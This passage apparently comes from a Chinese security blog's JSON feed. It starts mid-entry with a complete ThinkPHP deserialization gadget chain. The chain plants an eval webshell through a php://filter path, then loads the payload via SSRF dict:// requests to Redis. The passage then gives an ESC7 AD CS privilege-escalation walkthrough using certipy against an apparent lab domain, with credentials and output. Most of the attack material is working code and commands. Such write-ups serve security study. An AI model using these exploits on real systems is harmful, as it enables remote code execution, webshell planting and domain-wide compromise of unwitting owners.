punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>relation</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#OneToOne HasOne</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>Relation</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">OneToOne</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Relation</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword static-context\">parent</span><span class=\"token operator\">::</span><span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">HasOne</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">OneToOne</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$bindAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword static-context\">parent</span><span class=\"token operator\">::</span><span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">bindAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"123\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Output</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>session<span class=\"token punctuation\">\\</span>driver<span class=\"token punctuation\">\\</span>Memcached</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Output</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$handle</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$styles</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">handle</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Memcached</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 目的调用其 write ()</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">styles</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'getAttr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Model</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>relation<span class=\"token punctuation\">\\</span>HasOne</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console<span class=\"token punctuation\">\\</span>Output</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>Query</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Model</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$error</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$parent</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#修改处</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$selfRelation</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$aaaaa</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">parent</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Output</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Output 对象，目的是调用__call ()</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'getError'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">error</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HasOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//Relation 子类，且有 getBindAttr ()</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">selfRelation</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//isSelfRelation()</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">query</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Query</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>db</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Query</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console<span class=\"token punctuation\">\\</span>Output</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Query</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">model</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Output</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>session<span class=\"token punctuation\">\\</span>driver</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Memcached</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>cache<span class=\"token punctuation\">\\</span>driver<span class=\"token punctuation\">\\</span>File</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Memcached</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$handler</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">handler</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 目的调用 File->set ()</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>cache<span class=\"token punctuation\">\\</span>driver</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#File</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">File</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$tag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token string single-quoted-string\">'expire'</span>        <span class=\"token operator\">=></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        <span class=\"token string single-quoted-string\">'cache_subdir'</span>  <span class=\"token operator\">=></span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token string single-quoted-string\">'prefix'</span>        <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        <span class=\"token string single-quoted-string\">'path'</span>          <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token string single-quoted-string\">'data_compress'</span> <span class=\"token operator\">=></span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">tag</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>Model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pivot</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Model</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes<span class=\"token punctuation\">\\</span>Windows</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token variable\">$aaa</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"think_serialize:\"</span><span class=\"token operator\">.</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Windows</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"http://ip/public/index.php?s=index/Index/geturl&amp;url=dict://127.0.0.1:6379/set:zls:\"</span><span class=\"token operator\">.</span><span class=\"token operator\">~</span><span class=\"token variable\">$aaa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"http://ip/public/index.php?s=index/Index/geturl&amp;url=dict://127.0.0.1:6379/bitop:not:save:zls:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"http://ip/public/index.php?s=index/Index/getname&amp;name=save\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre> <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"http://ip/public/a.php3b58a9545013e88c7186db11bb158c44.php\"</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure>",
            "tags": [
                "thinkphp反序列化",
                "redis缓存",
                "rce"
            ]
        },
        {
            "id": "https://zlte.netlify.app/2024/01/29/skill/xss-skill/",
            "url": "https://zlte.netlify.app/2024/01/29/skill/xss-skill/",
            "title": "xss深度利用/xss技巧",
            "date_published": "2024-01-28T18:33:08.815Z",
            "content_html": "<p>正在施工中.....</p>\n",
            "tags": [
                "xss"
            ]
        },
        {
            "id": "https://zlte.netlify.app/2024/01/24/tools/%E5%9F%9F%E7%94%A8%E6%88%B7%E8%AF%81%E4%B9%A6%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83/",
            "url": "https://zlte.netlify.app/2024/01/24/tools/%E5%9F%9F%E7%94%A8%E6%88%B7%E8%AF%81%E4%B9%A6%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83/",
            "title": "域控提权/域用户证书配置提权/ESC7",
            "date_published": "2024-01-23T17:20:34.000Z",
            "content_html": "<h2 id=\"一使用场景\"><a class=\"anchor\" href=\"#一使用场景\">#</a> 一。使用场景：</h2>\n<h3 id=\"11需要有证书服务器adcs配置错误的域用户密码或hash\"><a class=\"anchor\" href=\"#11需要有证书服务器adcs配置错误的域用户密码或hash\">#</a> 1.1 需要有证书服务器 (ADCS)&amp; 配置错误的域用户密码或 hash</h3>\n<h2 id=\"二使用步骤\"><a class=\"anchor\" href=\"#二使用步骤\">#</a> 二。使用步骤：</h2>\n<blockquote>\n<p>(看使用步骤前，建议先看步骤三注意与踩坑)</p>\n</blockquote>\n<h3 id=\"21查看域用户配置\"><a class=\"anchor\" href=\"#21查看域用户配置\">#</a> 2.1. 查看域用户配置</h3>\n<p><strong>拿到域用户的 hash 或密码后，用 <code>certipy</code>  工具远程读取用户证书配置是否存在配置错误，如果有错误会显示漏洞存在且打出漏洞名称：</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>certipy.exe <span class=\"token function\">find</span> <span class=\"token parameter variable\">-u</span> <span class=\"token string\">'raven@manager.htb'</span> <span class=\"token parameter variable\">-p</span> <span class=\"token string\">'R4v3nBe5tD3veloP3r!123'</span> -dc-ip <span class=\"token number\">10.10</span>.11.236 <span class=\"token parameter variable\">-vulnerable</span> <span class=\"token parameter variable\">-stdout</span></pre></td></tr></table></figure><p>​\t\t<strong>执行结果如下：</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PS D:<span class=\"token punctuation\">\\</span>miniconda<span class=\"token punctuation\">\\</span>Scripts<span class=\"token operator\">></span> certipy.exe <span class=\"token function\">find</span> <span class=\"token parameter variable\">-u</span> <span class=\"token string\">'raven@manager.htb'</span> <span class=\"token parameter variable\">-p</span> <span class=\"token string\">'R4v3nBe5tD3veloP3r!123'</span> -dc-ip <span class=\"token number\">10.10</span>.11.236 <span class=\"token parameter variable\">-vulnerable</span> <span class=\"token parameter variable\">-stdout</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Certipy v4.8.2 - by Oliver Lyak <span class=\"token punctuation\">(</span>ly4k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Finding certificate templates</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found <span class=\"token number\">33</span> certificate templates</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Finding certificate authorities</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found <span class=\"token number\">1</span> certificate authority</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found <span class=\"token number\">11</span> enabled certificate templates</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Trying to get CA configuration <span class=\"token keyword\">for</span> <span class=\"token string\">'manager-DC01-CA'</span> via CSRA</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Got CA configuration <span class=\"token keyword\">for</span> <span class=\"token string\">'manager-DC01-CA'</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Enumeration output:</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Certificate Authorities</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    CA Name                             <span class=\"token builtin class-name\">:</span> manager-DC01-CA</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    DNS Name                            <span class=\"token builtin class-name\">:</span> dc01.manager.htb</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    Certificate Subject                 <span class=\"token builtin class-name\">:</span> <span class=\"token assign-left variable\">CN</span><span class=\"token operator\">=</span>manager-DC01-CA, <span class=\"token assign-left variable\">DC</span><span class=\"token operator\">=</span>manager, <span class=\"token assign-left variable\">DC</span><span class=\"token operator\">=</span>htb</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    Certificate Serial Number           <span class=\"token builtin class-name\">:</span> 5150CE6EC048749448C7390A52F264BB</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    Certificate Validity Start          <span class=\"token builtin class-name\">:</span> <span class=\"token number\">2023</span>-07-27 <span class=\"token number\">10</span>:21:05+00:00</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    Certificate Validity End            <span class=\"token builtin class-name\">:</span> <span class=\"token number\">2122</span>-07-27 <span class=\"token number\">10</span>:31:04+00:00</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    Web Enrollment                      <span class=\"token builtin class-name\">:</span> Disabled</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    User Specified SAN                  <span class=\"token builtin class-name\">:</span> Disabled</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    Request Disposition                 <span class=\"token builtin class-name\">:</span> Issue</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    Enforce Encryption <span class=\"token keyword\">for</span> Requests     <span class=\"token builtin class-name\">:</span> Enabled</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    Permissions</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      Owner                             <span class=\"token builtin class-name\">:</span> MANAGER.HTB<span class=\"token punctuation\">\\</span>Administrators</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      Access Rights</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        Enroll                          <span class=\"token builtin class-name\">:</span> MANAGER.HTB<span class=\"token punctuation\">\\</span>Operator</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                                          MANAGER.HTB<span class=\"token punctuation\">\\</span>Authenticated Users</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                                          MANAGER.HTB<span class=\"token punctuation\">\\</span>Raven</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        ManageCertificates              <span class=\"token builtin class-name\">:</span> MANAGER.HTB<span class=\"token punctuation\">\\</span>Administrators</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                                          MANAGER.HTB<span class=\"token punctuation\">\\</span>Domain Admins</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                                          MANAGER.HTB<span class=\"token punctuation\">\\</span>Enterprise Admins</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        ManageCa                        <span class=\"token builtin class-name\">:</span> MANAGER.HTB<span class=\"token punctuation\">\\</span>Administrators</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                                          MANAGER.HTB<span class=\"token punctuation\">\\</span>Domain Admins</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                                          MANAGER.HTB<span class=\"token punctuation\">\\</span>Enterprise Admins</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                                          MANAGER.HTB<span class=\"token punctuation\">\\</span>Raven</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">]</span> Vulnerabilities</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      ESC7                              <span class=\"token builtin class-name\">:</span> <span class=\"token string\">'MANAGER.HTB\\\\Raven'</span> has dangerous permissions</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>Certificate Templates                   <span class=\"token builtin class-name\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">]</span> Could not <span class=\"token function\">find</span> any certificate templates</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>PS D:<span class=\"token punctuation\">\\</span>miniconda<span class=\"token punctuation\">\\</span>Scripts<span class=\"token operator\">></span></pre></td></tr></table></figure><h3 id=\"22-拿到对应漏洞esc7进一步远程攻击\"><a class=\"anchor\" href=\"#22-拿到对应漏洞esc7进一步远程攻击\">#</a> 2.2 拿到对应漏洞 (ESC7) 进一步远程攻击</h3>\n<h4 id=\"221创建证书\"><a class=\"anchor\" href=\"#221创建证书\">#</a> 2.2.1. 创建证书</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>certipy.exe ca <span class=\"token parameter variable\">-ca</span> <span class=\"token string\">'manager-DC01-CA'</span> -add-officer raven <span class=\"token parameter variable\">-username</span> raven@manager.htb <span class=\"token parameter variable\">-password</span> <span class=\"token string\">'R4v3nBe5tD3veloP3r!123'</span> -dc-ip <span class=\"token 